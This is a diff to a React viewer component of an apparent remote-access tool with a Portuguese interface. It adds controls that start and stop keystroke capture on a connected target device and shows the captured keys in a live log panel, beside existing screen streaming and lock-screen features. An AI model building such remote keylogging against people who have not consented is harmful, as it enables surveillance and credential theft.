@@ -1,7 +1,7 @@
 import { useEffect, useState, useRef, useCallback } from 'react';
 import {
   X, Maximize2, Minimize2, Settings, Lock, Unlock,
-  Upload, Clipboard, Keyboard, Mouse, ZoomIn, ZoomOut, Zap, ChevronDown
+  Upload, Clipboard, Keyboard, Mouse, ZoomIn, ZoomOut, Zap, ChevronDown, Eye, EyeOff
 } from 'lucide-react';
 import { cn } from '../lib/utils';
 
@@ -29,6 +29,10 @@ export function ViewerWindow() {
   const [lockScreens, setLockScreens] = useState([]);
   const [selectedLockScreen, setSelectedLockScreen] = useState(null);
   const [showLockMenu, setShowLockMenu] = useState(false);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [capturedKeys, setCapturedKeys] = useState('');
+  const [showCaptureLog, setShowCaptureLog] = useState(false);
+  const captureLogRef = useRef(null);
 
   const canvasRef = useRef(null);
   const containerRef = useRef(null);
@@ -65,10 +69,20 @@ export function ViewerWindow() {
         setConnected(true);
         ws.send(JSON.stringify({ type: 'connect-to-client', targetId: deviceId }));
         ws.send(JSON.stringify({ type: 'get-lock-state', targetId: deviceId }));
+        ws.send(JSON.stringify({ type: 'get-capture-state', targetId: deviceId }));
       }
 
       if (msg.type === 'lock-state' && msg.targetId === deviceId) {
         setIsLocked(msg.locked);
+      }
+
+      if (msg.type === 'capture-state' && msg.targetId === deviceId) {
+        setIsCapturing(msg.capturing);
+        if (msg.capturing) setShowCaptureLog(true);
+      }
+
+      if (msg.type === 'captured-keys' && msg.clientId === deviceId) {
+        setCapturedKeys(prev => prev + msg.keys);
       }
 
       if (msg.type === 'screen-frame' && msg.clientId === deviceId) {
@@ -202,6 +216,25 @@ export function ViewerWindow() {
     setShowLockMenu(false);
   };
 
+  const handleCapture = () => {
+    if (isCapturing) {
+      send({ type: 'stop-capture', targetId: deviceId });
+      setIsCapturing(false);
+    } else {
+      send({ type: 'start-capture', targetId: deviceId });
+      setIsCapturing(true);
+      setShowCaptureLog(true);
+      setCapturedKeys('');
+    }
+  };
+
+  // Auto-scroll capture log
+  useEffect(() => {
+    if (captureLogRef.current) {
+      captureLogRef.current.scrollTop = captureLogRef.current.scrollHeight;
+    }
+  }, [capturedKeys]);
+
   useEffect(() => {
     containerRef.current?.focus();
   }, []);
@@ -279,6 +312,15 @@ export function ViewerWindow() {
             )}
           </div>
 
+          {/* Capture Input */}
+          <button
+            onClick={handleCapture}
+            className={cn("p-1.5 rounded", isCapturing ? "bg-green-500/20 text-green-400" : "text-white/40 hover:text-white")}
+            title={isCapturing ? "Parar Captura" : "Capturar Input"}
+          >
+            {isCapturing ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+          </button>
+
           <div className="relative">
             <button onClick={() => setShowSettings(!showSettings)} className="p-1.5 text-white/40 hover:text-white">
               <Zap className="w-4 h-4" />
@@ -328,6 +370,39 @@ export function ViewerWindow() {
         <span>{frameSize.width}x{frameSize.height} | Q:{quality}% S:{Math.round(scale*100)}%</span>
         <span>{connected ? 'Conectado' : 'Desconectado'}</span>
       </div>
+
+      {/* Capture Log Panel */}
+      {showCaptureLog && (
+        <div className="absolute bottom-8 right-2 w-80 max-h-60 bg-zinc-900/95 border border-white/10 rounded-lg shadow-xl overflow-hidden z-50">
+          <div className="flex items-center justify-between px-3 py-2 border-b border-white/10 bg-zinc-800">
+            <div className="flex items-center gap-2">
+              <Eye className="w-3.5 h-3.5 text-green-400" />
+              <span className="text-xs text-white/70 font-medium">Capture Input</span>
+              {isCapturing && <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />}
+            </div>
+            <div className="flex items-center gap-1">
+              <button
+                onClick={() => setCapturedKeys('')}
+                className="text-[10px] text-white/40 hover:text-white px-2 py-0.5 hover:bg-white/10 rounded"
+              >
+                Limpar
+              </button>
+              <button
+                onClick={() => setShowCaptureLog(false)}
+                className="p-1 text-white/40 hover:text-white hover:bg-white/10 rounded"
+              >
+                <X className="w-3 h-3" />
+              </button>
+            </div>
+          </div>
+          <div
+            ref={captureLogRef}
+            className="p-3 max-h-44 overflow-auto font-mono text-xs text-green-400 whitespace-pre-wrap break-all"
+          >
+            {capturedKeys || <span className="text-white/30 italic">Aguardando input...</span>}
+          </div>
+        </div>
+      )}
     </div>
   );
 }
